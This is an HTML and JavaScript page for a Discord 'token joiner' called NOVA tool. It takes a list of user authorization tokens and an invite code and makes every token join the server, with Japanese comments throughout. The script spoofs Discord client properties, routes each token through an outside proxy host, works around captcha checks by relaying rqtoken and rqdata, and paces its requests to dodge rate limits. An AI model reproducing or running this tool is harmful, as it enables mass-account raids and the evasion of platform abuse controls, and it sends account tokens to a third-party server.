<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA tool - Ultra Bypass & Joiner</title>
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
    <style>
        :root {
            --bg-color: #0d0d15;
            --card-bg: #1a1a2e;
            --text-color: #f0f0f5;
            --primary: #00d4ff;
            --secondary: #7000ff;
            --danger: #ff0055;
            --success: #00ffa3;
            --warning: #ffa500;
            --border: #2e2e4a;
            --discord: #5865F2;
        }

        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); display: flex; justify-content: center; padding: 20px; margin: 0; }
        .container { width: 100%; max-width: 650px; background: var(--card-bg); padding: 30px; border-radius: 16px; box-shadow: 0 0 40px rgba(0, 212, 255, 0.2); border: 1px solid var(--border); position: relative; }

        header { text-align: center; margin-bottom: 25px; }
        .brand-title { margin: 0; font-size: 32px; font-weight: 900; letter-spacing: 6px; color: var(--primary); text-shadow: 0 0 20px rgba(0, 212, 255, 0.6); text-transform: uppercase; }
        .subtitle { font-size: 11px; text-transform: uppercase; opacity: 0.7; letter-spacing: 4px; font-weight: bold; color: var(--secondary); }

        .section { margin-bottom: 15px; }
        label { display: block; font-size: 10px; margin-bottom: 5px; color: var(--primary); font-weight: bold; text-transform: uppercase; }

        textarea, input[type="text"] { width: 100%; padding: 12px; background: #050510; border: 1px solid var(--border); border-radius: 8px; color: white; box-sizing: border-box; outline: none; font-family: 'Consolas', monospace; font-size: 13px; }
        textarea { height: 100px; resize: vertical; }
        textarea.masked { -webkit-text-security: disc !important; }

        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0; text-align: center; }
        .stat-box { background: rgba(0,0,0,0.5); padding: 12px; border-radius: 10px; border: 1px solid var(--border); }
        .stat-box span { font-size: 9px; opacity: 0.6; display: block; margin-bottom: 4px; }
        .stat-box strong { font-size: 24px; font-family: 'Consolas', monospace; display: block; }

        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.2s; font-size: 14px; letter-spacing: 2px; }
        .btn-join { background: var(--discord); color: white; margin-top: 10px; }
        .btn:hover { filter: brightness(1.2); transform: scale(1.01); }

        #captcha-box { margin-top: 15px; display: flex; justify-content: center; min-height: 80px; }

        .status-log { margin-top: 20px; background: #050510; border: 1px solid var(--border); border-radius: 8px; height: 180px; overflow-y: auto; padding: 12px; font-size: 11px; font-family: 'Consolas', monospace; }
        .log-entry { margin-bottom: 4px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 2px; }
        .log-success { color: var(--success); }
        .log-error { color: var(--danger); }
        .log-info { color: var(--primary); }
        .log-warn { color: var(--warning); }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1 class="brand-title">NOVA TOOL</h1>
        <p class="subtitle">Secure Joiner & Bypass Engine</p>
    </header>

    <div class="section">
        <label>User Tokens</label>
        <textarea id="tokens" class="masked" placeholder="Paste tokens here (one per line)"></textarea>
    </div>

    <div class="section">
        <label>Invite Link / Code</label>
        <input type="text" id="inviteInput" placeholder="https://discord.gg/xxxx">
    </div>

    <div id="captcha-box"></div>

    <div class="stats-grid">
        <div class="stat-box"><span>COMPLETED</span><strong id="countSuccess" style="color:var(--success)">0</strong></div>
        <div class="stat-box"><span>TOTAL</span><strong id="countTotal">0</strong></div>
    </div>

    <button id="joinBtn" class="btn btn-join">START JOINER SEQUENCE</button>

    <div class="status-log" id="logArea">
        <div class="log-entry"><span>[SYSTEM] NOVA online. Standby.</span></div>
    </div>
</div>

<script>
    let captchaQueue = [];
    let currentFingerprint = null;
    let successCount = 0;

    function addLog(msg, type = '', num = null) {
        const div = document.createElement('div');
        div.className = 'log-entry';
        const time = new Date().toLocaleTimeString([], { hour12: false });
        div.innerHTML = `<span style="color:#444">[${time}]</span> <span class="log-${type}">${num ? `[${num}] ` : ''}${msg}</span>`;
        const logArea = document.getElementById('logArea');
        logArea.prepend(div);
    }

    function getSuperProperties() {
        return btoa(JSON.stringify({
            "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "ja",
            "browser_user_agent": navigator.userAgent, "browser_version": "120.0.0.0",
            "os_version": "10", "referrer": "", "referring_domain": "", "release_channel": "stable",
            "client_build_number": 250000, "client_event_source": null
        }));
    }

    async function getFingerprintAndSetCookie() {
        try {
            const response = await fetch("https://discord-api.soyaaaaana.com/experiments", {
                headers: {
                    "x-context-properties": btoa(JSON.stringify({ location: "/channels/@me" })),
                    "x-super-properties": getSuperProperties(),
                },
                method: "GET"
            });
            if (response.ok) {
                const data = await response.json();
                currentFingerprint = data.fingerprint;
                addLog('Fingerprint acquired.', 'info');
                return data.fingerprint;
            }
        } catch (e) { console.error(e); }
        return null;
    }

    // --- 強化版 Joiner (CORS回避・rqdata・session-id対応) ---
    async function joinServer(token, inviteCode, num, captchaData = null) {
        if (!currentFingerprint) await getFingerprintAndSetCookie();

        const sessionId = crypto.randomUUID().replace(/-/g, '');
        const headers = {
            "authorization": token.trim(),
            "content-type": "application/json",
            "x-fingerprint": currentFingerprint,
            "x-super-properties": getSuperProperties(),
            "x-context-properties": btoa(JSON.stringify({
                location: "Join Guild",
                location_guild_id: null,
                location_channel_id: null,
                location_channel_type: null
            }))
        };

        if (captchaData) {
            headers["x-captcha-key"] = captchaData.key;
            headers["x-captcha-rqtoken"] = captchaData.rqtoken;
            headers["x-captcha-session-id"] = sessionId;
        }

        try {
            const proxyUrl = `https://discord-api.soyaaaaana.com/invites/${inviteCode}`;
            
            const res = await fetch(proxyUrl, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({ 
                    session_id: sessionId,
                }),
                credentials: "include"
            });

            const data = await res.json();
            
            if (res.ok && data.code) {
                addLog('JOIN: Success', 'success', num);
                successCount++;
                document.getElementById('countSuccess').innerText = successCount;
                processNextCaptcha();
            } else if (data.captcha_sitekey) {
                addLog('CAPTCHA: Required', 'warn', num);
                captchaQueue.push({ 
                    token, 
                    inviteCode, 
                    num, 
                    sitekey: data.captcha_sitekey, 
                    rqtoken: data.captcha_rqtoken,
                    rqdata: data.captcha_rqdata 
                });
                if (captchaQueue.length === 1) renderCaptcha();
            } else {
                addLog(`ERROR (${res.status}: ${data.message || 'Unknown'})`, 'error', num);
                processNextCaptcha();
            }
        } catch (e) { 
            addLog('Request Failed', 'error', num); 
        }
    }

    // --- Captcha レンダリング (rqdata対応) ---
    function renderCaptcha() {
        if (!captchaQueue.length) return;
        const item = captchaQueue[0];
        const captchaBox = document.getElementById('captcha-box');
        captchaBox.innerHTML = ""; 

        const widgetId = window.hcaptcha.render("captcha-box", {
            sitekey: item.sitekey,
            callback: (key) => {
                window.hcaptcha.reset();
                joinServer(item.token, item.inviteCode, item.num, { key, rqtoken: item.rqtoken });
                captchaQueue.shift();
            }
        });

        if (item.rqdata) {
            window.hcaptcha.setData(widgetId, { rqdata: item.rqdata });
        }
    }

    function processNextCaptcha() {
        document.getElementById('captcha-box').innerHTML = "";
        if (captchaQueue.length > 0) renderCaptcha();
    }

    document.getElementById('joinBtn').addEventListener('click', async () => {
        const tokens = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
        const inviteRaw = document.getElementById('inviteInput').value.trim();
        const invite = inviteRaw.split('/').pop();
        
        if (!tokens.length || !invite) {
            addLog('Please enter tokens and invite link.', 'error');
            return;
        }

        document.getElementById('countTotal').innerText = tokens.length;
        addLog('Starting sequence...', 'info');

        for (let i = 0; i < tokens.length; i++) {
            await joinServer(tokens[i], invite, i + 1);
            // レート制限を避けるための短い待機
            await new Promise(r => setTimeout(r, 1500));
        }
    });
</script>
</body>
</html>
